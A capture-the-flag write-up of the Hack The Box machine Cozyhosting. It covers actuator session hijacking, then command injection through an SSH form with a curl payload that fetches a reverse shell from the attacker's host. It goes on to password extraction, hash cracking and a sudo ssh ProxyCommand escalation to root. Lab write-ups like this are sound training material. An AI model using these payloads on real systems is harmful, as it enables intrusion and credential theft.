---
title: HTB Cozyhosting Writeup
date: 2023-10-13 09:20:16 +0600
categories: [Linux, Easy]
tags: [htb] 
toc: true    
---

![Cozyhosting Pwned](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_pwned.PNG "Pwned haha!!")

# Introduction
Hi, Hackers!!. Today we will solve the HTB machine Cozyhosting. It is a fun linux machine. And also tagged as Easy. Let's dive into the fun stuff
without wasting any time.

# Enumeration
Just like as usual, when you approach a machine or box, first thing to do is to scan for open ports. For scanning ports, you can use the traditional tool `Nmap`. But `Nmap` is kinda slow. As an alternative, we can use `Rustscan` or `threader3000`. I used `Rustscan` for scanning. Found the ports 22 and 80 open.

![Cozyhosting Rustscan](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_rustscan.png)

And also found what services are running in those open ports.

![Cozyhosting Services](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_nmap_service.png)

If you search with the given IP in your browser, you will be redirected to `http://cozyhosting.htb`. So we need to add the IP and hostname in the hosts file. For linux, it's `/etc/hosts` and for windows, it's `c:\Windows\System32\Drivers\etc\hosts`.

Then we get,

![Home Page](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_port80.png)

And We found a login page too.

![Login Page](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_login.png)

But we still don't know what could be under there. So I searched for `robots.txt`. And I found this.

![Error Page](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_error.png)

I googled it and found that it's a `Spring Boot` framework. Next, let's search for more directories. As it is a spring boot framework, you can use `seclists` spring boot wordlist. I used dirsearch.

![Found More](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_dirsearch.png)

We found a couple of `actuator` directories and found `admin` page which is giving unauthorized(401). Let's visit this `actuator` dir...

![Actuator Dir](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_actuator.png)

The important one could be `sessions`. Let's see....

![Sessions Dir](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_sessions.png)

These are session cookies that we found. This could be useful for session hijacking through `/admin` page. Using one of the session cookies,
send the request to `/admin` page.

![Session Req](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_req.PNG)

Now we are in the admin page.

![Admin Dashboard](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_admin_dashboard.png)

And a form for ssh connections, I suppose.

![SSH Form](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_admin_form.png)

# Foothold

As the form is running ssh, we should find out if we can find command injection. Let's analyze a normal behavior first.

```Plaintext

POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Upgrade-Insecure-Requests: 1

host=test&username=test

```

```Plaintext

HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Oct 2023 13:15:03 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname test: Temporary failure in name resolution
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

```

Let's examine the host parameter. we can use ``id`` or `$(id)`

```Plaintext

POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Upgrade-Insecure-Requests: 1

host=$(id)&username=test

```

```Plaintext

HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Oct 2023 13:26:39 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=Invalid hostname!
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

```
Gave invalid. Let's try the username parameter now.

```Plaintext

POST /executessh HTTP/1.1
Host: cozyhosting.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://cozyhosting.htb
Connection: close
Referer: http://cozyhosting.htb/admin
Upgrade-Insecure-Requests: 1

host=test&username=$(id)

```

```Plaintext

HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Oct 2023 13:32:03 GMT
Content-Length: 0
Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname uid=1001(app): Name or service not known
Connection: close
X-Content-Type-Options: nosniff
X-XSS-Protection: 0
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Frame-Options: DENY

```

Now we get a response. It's responding with uid result. We have a command injection vulnerability. Let's try to get a reverse shell. As it doesn't take whitespace, we have to replace all whitespaces. We can use `$IFS` for it. The command that should help us: `$(IFS=_;Com=id;$Com)`

To store a reverse shell in the server, we can use the `curl` command as `wget` doesn't work here. Open a server with python: `python3 -m http.server 4444`. Then we can download the reverse shell with `curl`. So the payload would be: `$(IFS=_;Com=curl_http://10.10.10.10/shell.sh_-w_/tmp/shell.sh;$Com)`

Then after giving the execute permission, if we run the shell We will get a reverse shell.

# Lateral Movement

We got the shell, but not a stable one. Let's stable it first. Python3 is available in the server as it happens.

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z(bg)
$ stty raw -echo;fg
$ export TERM = xterm
```
As we are in the machine, the traditional step would be to run linpeas.sh on the machine. And also there is a jar file called `cloudhosting-0.0.1`. Extract the jar file and run linpeas.

I tried to open the jar file with `JADX`. But it's too much to find something. Then used `egrep` to filter some passwords.

![Jar file](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_cloud.png)

Also the linpeas results:

![Found Postgres](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_linpeas.png)

![Users Found](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_users_linpeas.png)

Filtering the jar file, we found a password. And from linpeas, there is a postgres server running and potential users of the machine. We can use the password to enter into the postgres server. After entering into the postgres, we enumerated and found `cozyhosting` database, `users` table and two bcrypt hashes. If you give those to hashcat with our favorite wordlist `rockyou.txt`, you will get this.

![Hashcat Result](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_hashcat.PNG)

We can get into machine this time with ssh as we have the password and users. We're in.

# Privilege Escalation

![User Josh](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_josh.png)

User josh can run ssh as root. So now we go to our trusted old friend [GTFOBins](https://gtfobins.github.io/). Run the ssh command as root.

```bash
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
Now we are root.

![Voila!](https://raw.githubusercontent.com/ImdadMiran17/ImdadMiran17.github.io/main/assets/img/cozyhosting-htb/cozyhosting_user_root.png)

Happy Hacking!!!